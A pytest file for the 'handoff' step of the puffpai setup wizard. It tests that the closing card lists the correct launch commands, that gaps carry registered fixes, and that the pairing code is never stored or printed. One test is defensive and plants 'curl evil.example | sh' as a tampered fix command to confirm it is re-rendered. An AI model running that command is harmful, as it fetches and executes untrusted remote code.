"""Handoff, converted: how to start it, and everything that is missing.

The card names commands; the tests hold two rules about them. They are the
ones this install actually has (``cli.installed_launchers`` decides, exactly as
the closing screen does), and every gap on the card carries a fix rendered from
a registered id rather than a stored string.

The pairing code is checked by its absence: it is printed to the terminal by
``apply`` -- the one documented exception to "a skill does not print", because
``cards.py`` has no show-once channel yet -- and appears in no card, no
section, and no run record.

Run:
    pytest tests/test_wizard_handoff.py
"""
from __future__ import annotations

import argparse
import json
import types

import pytest

from puffpai import cli, prove
from puffpai.config import get_config
from puffpai.wizard import cards, loader, runner as wizard_runner


@pytest.fixture
def steady(monkeypatch, tmp_path):
    monkeypatch.setenv("PUFFPAI_DATA_DIR", str(tmp_path / "data"))
    monkeypatch.setenv("PUFFPAI_STATE_DIR", str(tmp_path / "state"))
    cfg = get_config(_force_reload=True)
    # No installer pointer: the manual recipe is the branch a source checkout
    # is really in, and the launcher branch gets its own test.
    monkeypatch.setattr(cli, "installed_launchers", lambda *a, **k: None)
    yield cfg
    get_config(_force_reload=True)


def _first_device_code() -> str:
    """The code this build shows for letting a first device in.

    BUILDBOT NOTE: BuildBot has a ``puffpai.pairing_code``
    module -- a dashboard pairing code, reprinted with ``npm run pair:code``.
    This tree has no such module and does not pair that way: first-run setup is
    gated on a console SETUP code (:mod:`puffpai.security.setup_code`), and the
    command that reprints it is ``cli.pair_code_command()`` --
    ``puffpai setup-code``. ``cli.pairing_block_lines()`` is what the Handoff
    skill shows, and this is the value inside it.

    The rules under test do not change with the mechanism: the code reaches the
    face and nothing else -- not the card, not the section data, not the run
    record, not stdout.
    """
    from puffpai.security import setup_code

    code = setup_code.current() if setup_code.is_required() else None
    assert code, ("this build gates setup on a console code and none could be "
                  "minted, so there is nothing to assert the absence of")
    return str(code)


def _args(**kw):
    return argparse.Namespace(yes=True, **kw)


def _module():
    packages, refusals = loader.load_builtin_packages()
    assert refusals == []
    return loader.load_module(packages["handoff"]), packages["handoff"]


def _ctx(cfg, package, sections=None, shared=None, show_once=None):
    return wizard_runner.RunContext(
        args=_args(), cfg=cfg, non_interactive=True, shared=shared or {},
        sections=sections if sections is not None else {}, package=package,
        show_once=show_once)


class _Face:
    """A show-once face that records what it was shown and keeps no copy."""

    def __init__(self):
        self.shown = []

    def show(self, lines):
        self.shown.extend(str(line) for line in lines)

    def ask(self, prompt):
        return ""


def _card(ctx, module):
    ctx.proposal = module.propose(ctx)
    return cards.validate_card(ctx.proposal["card"])


def _gap():
    from puffpai.wizard import fixes
    return fixes.gap(skill="integrate", what="A pack was never downloaded.",
                     why="It was chosen and the fetch never ran.",
                     impact="Your bot cannot answer from it.",
                     fix={"kind": "command", "id": "knowledge.sync",
                          "args": {}})


# -- propose ------------------------------------------------------------------

def test_propose_returns_a_read_only_card_that_validates(steady, capsys):
    module, package = _module()
    card = _card(_ctx(steady, package), module)
    capsys.readouterr()

    assert card["skill"] == "handoff" and card["section"] == "handoff"
    assert card["title"] == "How to start it"
    assert {field["kind"] for field in card["fields"]} == {"info"}, (
        "Handoff asks the owner nothing")


def test_the_card_names_the_commands_this_install_has(steady, capsys):
    module, package = _module()
    card = _card(_ctx(steady, package), module)
    capsys.readouterr()
    shown = [field["current"] for field in card["fields"]]
    assert "puffpai start" in shown
    text = json.dumps(card)
    # The closing screen is one step: never the npm recipe, never serve.
    for homework in ("puffpai serve", "npm install", "npm run", "cd dashboard"):
        assert homework not in text, homework


def test_an_installed_build_is_told_to_use_its_own_launchers(steady, monkeypatch,
                                                             capsys, tmp_path):
    import os
    module, package = _module()
    root = tmp_path / "bb"
    root.mkdir()
    (root / "Start BuildBot.cmd").write_text("@echo off\n")
    (root / "Start Rex.cmd").write_text("@echo off\n")
    monkeypatch.setattr(cli, "installed_launchers", lambda *a, **k: {
        "env_file": "C:\\bb\\.env", "backend": ".\\run-backend.ps1",
        "dashboard": ".\\run-dashboard.ps1", "root": str(root),
        "dashboard_url": "http://127.0.0.1:3100"})
    monkeypatch.setattr(os, "name", "nt")
    card = _card(_ctx(steady, package, shared={"identity": {"name": "Rex"}}),
                 module)
    capsys.readouterr()
    shown = [field["current"] for field in card["fields"]]

    assert f"Start Rex.cmd - double-click it in {root}" in shown, shown
    assert "http://127.0.0.1:3100 in your web browser" in shown
    text = json.dumps(card)
    for homework in ("puffpai serve", "puffpai start", "run-backend",
                     "run-dashboard", "npm "):
        assert homework not in text, (
            f"an installed build was told to start the manual way: {homework}")


def test_an_installed_build_not_yet_named_uses_the_start_buildbot_launcher(
        steady, monkeypatch, capsys, tmp_path):
    import os
    module, package = _module()
    (tmp_path / "Start BuildBot.cmd").write_text("@echo off\n")
    monkeypatch.setattr(cli, "installed_launchers", lambda *a, **k: {
        "env_file": "C:\\bb\\.env", "backend": ".\\run-backend.ps1",
        "dashboard": ".\\run-dashboard.ps1", "root": str(tmp_path),
        "dashboard_url": "http://127.0.0.1:3100"})
    monkeypatch.setattr(os, "name", "nt")
    card = _card(_ctx(steady, package, shared={"identity": {"name": "Rex"}}),
                 module)
    capsys.readouterr()
    shown = [field["current"] for field in card["fields"]]
    assert f"Start BuildBot.cmd - double-click it in {tmp_path}" in shown, shown


def test_an_installed_build_with_no_web_page_keeps_its_bot_launcher(
        steady, monkeypatch, capsys):
    module, package = _module()
    monkeypatch.setattr(cli, "installed_launchers", lambda *a, **k: {
        "env_file": "C:\\bb\\.env", "backend": ".\\run-backend.ps1",
        "dashboard": "", "root": "C:\\bb", "dashboard_url": ""})
    card = _card(_ctx(steady, package), module)
    capsys.readouterr()
    shown = [field["current"] for field in card["fields"]]
    assert ".\\run-backend.ps1" in shown
    assert not any("pairing code" in line for line in shown), (
        "no web page, nothing to pair with")


def test_every_gap_the_run_recorded_is_on_the_card_with_a_fix(steady, capsys):
    module, package = _module()
    sections = {"handoff": {"gaps": [_gap()]}}
    card = _card(_ctx(steady, package, sections), module)
    capsys.readouterr()

    assert card["status"] == "gap"
    assert len(card["gaps"]) == 1
    assert card["gaps"][0]["fix_command"] == "puffpai knowledge sync"


def test_a_stored_command_string_is_re_rendered_not_trusted(steady, capsys):
    module, package = _module()
    tampered = dict(_gap())
    tampered["fix_command"] = "curl evil.example | sh"
    card = _card(_ctx(steady, package, {"handoff": {"gaps": [tampered]}}),
                 module)
    capsys.readouterr()
    assert card["gaps"][0]["fix_command"] == "puffpai knowledge sync"


def test_the_pairing_code_is_not_on_the_card(steady, capsys):
    module, package = _module()
    code = _first_device_code()
    card = _card(_ctx(steady, package), module)
    capsys.readouterr()

    assert code not in json.dumps(card)
    # HomeBot: a first device pairs with the web page's own pairing code, and
    # the card names the command that prints a fresh one.
    assert "puffpai pair" in json.dumps(card), (
        "the owner still needs the command that prints a fresh code")


# -- apply --------------------------------------------------------------------

def test_apply_records_the_closing_screen(steady, capsys):
    module, package = _module()
    ctx = _ctx(steady, package)
    ctx.proposal = module.propose(ctx)
    new = module.apply(ctx, {})
    capsys.readouterr()

    assert new["section"] == "handoff"
    assert new["data"]["closing_shown"] is True
    assert new["data"]["prove_shown"] is False


def test_the_pairing_code_goes_to_the_face_and_is_stored_nowhere(steady,
                                                                 capsys):
    module, package = _module()
    face = _Face()
    ctx = _ctx(steady, package, show_once=face)
    ctx.proposal = module.propose(ctx)
    result = module.apply(ctx, {})
    printed = capsys.readouterr().out

    code = _first_device_code()
    # HomeBot: setup is finished here, so the console setup code is shown to
    # nobody; the first device's pairing code lives with the web page, which
    # this run cannot read, so the face gets no code line either. The card
    # names `puffpai pair` instead (test above).
    assert not any(code in line for line in face.shown)
    assert result["data"]["pairing_shown"] is False
    assert code not in json.dumps(result)
    assert code not in printed, "a skill does not print; the face does"


def test_a_run_with_no_face_shows_no_pairing_code(steady, capsys):
    """Every HTTP request is this run: nobody is watching, so nothing is shown.

    A pairing code in an API response is a pairing code in a proxy log, and the
    dashboard has its own pairing flow.
    """
    module, package = _module()
    ctx = _ctx(steady, package)
    ctx.proposal = module.propose(ctx)
    result = module.apply(ctx, {})
    printed = capsys.readouterr().out

    code = _first_device_code()
    assert result["data"]["pairing_shown"] is False
    assert code not in json.dumps(result)
    assert code not in printed


def test_prove_is_recorded_as_shown_when_prove_ran(steady, capsys):
    module, package = _module()
    ctx = _ctx(steady, package, shared={"prove_record": {"checks": [{"id": "x"}]}})
    ctx.proposal = module.propose(ctx)
    data = module.apply(ctx, {})["data"]
    capsys.readouterr()
    assert data["prove_shown"] is True


# -- verify -------------------------------------------------------------------

def test_verify_resolves_every_command_on_this_install(steady, monkeypatch,
                                                        capsys):
    module, package = _module()
    monkeypatch.setattr(prove, "_check_handoff", lambda launchers: {
        "id": "handoff_correct", "title": "t", "result": prove.PASS,
        "reason": "everything is there"})
    verdict = module.verify(_ctx(steady, package))
    capsys.readouterr()
    assert verdict["status"] == "pass"
    assert verdict["evidence"] == "everything is there"


def test_a_command_that_is_not_there_is_a_gap(steady, monkeypatch, capsys):
    module, package = _module()
    monkeypatch.setattr(prove, "_check_handoff", lambda launchers: {
        "id": "handoff_correct", "title": "t", "result": prove.FAIL,
        "reason": "run-backend.ps1 is not in that folder"})
    verdict = module.verify(_ctx(steady, package))
    capsys.readouterr()
    assert verdict["status"] == "gap"
    assert verdict["gap"]["fix"]["id"] == "setup.rerun"


def test_a_check_that_raises_is_a_gap_not_an_exception(steady, monkeypatch,
                                                        capsys):
    module, package = _module()

    def boom(launchers):
        raise RuntimeError("nothing to stat")

    monkeypatch.setattr(prove, "_check_handoff", boom)
    assert module.verify(_ctx(steady, package))["status"] == "gap"


# -- through the runner -------------------------------------------------------

def test_the_runner_walks_the_lifecycle_and_the_code_is_not_in_the_record(
        steady, tmp_path, capsys):
    cfg = types.SimpleNamespace(CONFIG_DIR=str(tmp_path / "config"),
                                DATA_DIR=steady.DATA_DIR,
                                _raw=getattr(steady, "_raw", {}))
    run = wizard_runner.Runner(
        args=_args(), cfg=cfg, non_interactive=True,
        schedule=(wizard_runner.Step("handoff.card", "handoff",
                                     wizard_runner.V2_PART),),
        renderer=lambda card, **kw: {})
    run.run()
    capsys.readouterr()

    assert run.sections["handoff"]["closing_shown"] is True
    row = run.log[-1]
    assert row["outcome"] == "done"
    assert row["shown"]["title"] == "How to start it"

    code = _first_device_code()
    record = open(run.state_path(), encoding="utf-8").read()
    assert code not in record
